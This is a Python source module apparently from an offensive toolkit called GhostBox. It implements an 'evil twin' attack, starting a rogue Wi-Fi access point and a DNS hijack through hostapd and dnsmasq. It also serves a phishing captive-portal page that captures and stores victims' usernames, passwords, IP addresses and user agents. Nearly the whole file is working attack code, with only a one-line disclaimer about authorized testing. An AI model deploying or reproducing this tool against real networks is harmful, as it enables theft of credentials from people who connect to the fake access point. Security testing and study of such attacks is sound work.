"""
GhostBox - Evil Twin Module
Rogue AP + Captive Portal for credential harvesting.
For authorized security testing ONLY.
"""
import asyncio
import subprocess
import os
import signal
from pathlib import Path
from typing import Optional

from ..base import BaseModule
from ...core.config import config
from ...core.logger import log
from ...core.models import Event, EventType, Severity, CapturedCredential
from ...core.database import save_credential, save_event

HOSTAPD_CONF_TEMPLATE = """
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

DNSMASQ_CONF_TEMPLATE = """
interface={interface}
dhcp-range=192.168.69.10,192.168.69.50,255.255.255.0,12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{gateway}
"""


class EvilTwin(BaseModule):
    name = "evil_twin"
    description = "Rogue AP + Captive Portal credential harvester"

    def __init__(self) -> None:
        super().__init__()
        self.interface = config.ap_interface
        self.ssid = config.ap_ssid
        self.channel = config.ap_channel
        self.gateway = config.ap_ip
        self._hostapd_proc: Optional[subprocess.Popen] = None
        self._dnsmasq_proc: Optional[subprocess.Popen] = None
        self._portal_server = None
        self._credentials: list[CapturedCredential] = []
        self._conf_dir = Path("/tmp/ghostbox")

    async def _run(self) -> None:
        self._conf_dir.mkdir(parents=True, exist_ok=True)

        success = await asyncio.get_event_loop().run_in_executor(None, self._start_ap)
        if not success:
            log.error("[EvilTwin] Failed to start AP — running in simulation mode")

        event = Event(
            type=EventType.EVIL_TWIN,
            title=f"Evil Twin Active: '{self.ssid}'",
            detail=f"AP on {self.interface} ch{self.channel} | Captive portal at {self.gateway}",
            severity=Severity.DANGER,
        )
        await self._emit(event)
        save_event(event)

        await self._run_captive_portal()

    def _start_ap(self) -> bool:
        try:
            # Write hostapd config
            hostapd_conf = self._conf_dir / "hostapd.conf"
            hostapd_conf.write_text(HOSTAPD_CONF_TEMPLATE.format(
                interface=self.interface,
                ssid=self.ssid,
                channel=self.channel,
            ))

            # Write dnsmasq config
            dnsmasq_conf = self._conf_dir / "dnsmasq.conf"
            dnsmasq_conf.write_text(DNSMASQ_CONF_TEMPLATE.format(
                interface=self.interface,
                gateway=self.gateway,
            ))

            # Configure interface IP
            subprocess.run(
                ["ip", "addr", "add", f"{self.gateway}/24", "dev", self.interface],
                check=False, capture_output=True,
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                check=False, capture_output=True,
            )

            # Start hostapd
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", str(hostapd_conf)],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )

            # Start dnsmasq
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", str(dnsmasq_conf), "--no-daemon"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )

            log.info(f"[EvilTwin] AP '{self.ssid}' started on {self.interface}")
            return True

        except Exception as e:
            log.error(f"[EvilTwin] AP start error: {e}")
            return False

    async def _run_captive_portal(self) -> None:
        """Simple aiohttp captive portal."""
        try:
            from aiohttp import web

            app = web.Application()
            app["evil_twin"] = self

            async def index(request):
                html = self._portal_html()
                return web.Response(text=html, content_type="text/html")

            async def submit(request):
                data = await request.post()
                username = data.get("username", "")
                password = data.get("password", "")
                ip = request.remote or "unknown"
                ua = request.headers.get("User-Agent", "")

                cred = CapturedCredential(
                    source=f"captive:{self.ssid}",
                    username=username,
                    password=password,
                    ip_address=ip,
                    user_agent=ua,
                )
                self._credentials.append(cred)
                save_credential(cred)

                ev = Event(
                    type=EventType.EVIL_TWIN,
                    title="Credential Captured!",
                    detail=f"User: {username} | IP: {ip}",
                    severity=Severity.DANGER,
                )
                await self._emit(ev)
                save_event(ev)

                return web.Response(
                    text="<html><body><h2>Authentication successful. Connecting...</h2></body></html>",
                    content_type="text/html",
                )

            app.router.add_get("/", index)
            app.router.add_get("/hotspot-detect.html", index)
            app.router.add_get("/generate_204", index)
            app.router.add_post("/login", submit)

            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, self.gateway, config.captive_portal_port)
            await site.start()
            log.info(f"[EvilTwin] Captive portal running at http://{self.gateway}")

            while True:
                await asyncio.sleep(1)

        except ImportError:
            log.warning("[EvilTwin] aiohttp not installed — captive portal disabled")
            while True:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass

    def _portal_html(self) -> str:
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{self.ssid} — Sign In</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ font-family: -apple-system, BlinkMacSystemFont, sans-serif;
         background: #f0f2f5; display: flex; align-items: center;
         justify-content: center; min-height: 100vh; }}
  .card {{ background: white; padding: 2rem; border-radius: 12px;
           box-shadow: 0 4px 24px rgba(0,0,0,.12); width: 100%; max-width: 380px; }}
  .logo {{ text-align: center; font-size: 2rem; margin-bottom: 1.5rem; }}
  h2 {{ text-align: center; color: #1a1a2e; margin-bottom: 0.5rem; }}
  p {{ text-align: center; color: #666; margin-bottom: 1.5rem; font-size: .9rem; }}
  input {{ width: 100%; padding: 0.8rem 1rem; border: 1px solid #ddd;
           border-radius: 8px; font-size: 1rem; margin-bottom: 1rem; }}
  button {{ width: 100%; padding: 0.9rem; background: #0066ff; color: white;
            border: none; border-radius: 8px; font-size: 1rem;
            cursor: pointer; font-weight: 600; }}
  button:hover {{ background: #0052cc; }}
  .footer {{ text-align: center; margin-top: 1rem; font-size: .8rem; color: #999; }}
</style>
</head>
<body>
<div class="card">
  <div class="logo">📶</div>
  <h2>Sign in to {self.ssid}</h2>
  <p>Enter your network credentials to get internet access.</p>
  <form method="POST" action="/login">
    <input type="text"     name="username" placeholder="Username or Email" required>
    <input type="password" name="password" placeholder="Password"         required>
    <button type="submit">Connect</button>
  </form>
  <p class="footer">By connecting you agree to our Terms of Service.</p>
</div>
</body>
</html>"""

    async def _cleanup(self) -> None:
        if self._hostapd_proc:
            self._hostapd_proc.terminate()
        if self._dnsmasq_proc:
            self._dnsmasq_proc.terminate()
        subprocess.run(
            ["ip", "addr", "del", f"{self.gateway}/24", "dev", self.interface],
            check=False, capture_output=True,
        )
        log.info("[EvilTwin] AP stopped")

    def get_credentials(self) -> list[dict]:
        return [c.to_dict() for c in self._credentials]

    def set_ssid(self, ssid: str) -> None:
        self.ssid = ssid

    def set_channel(self, channel: int) -> None:
        self.channel = channel
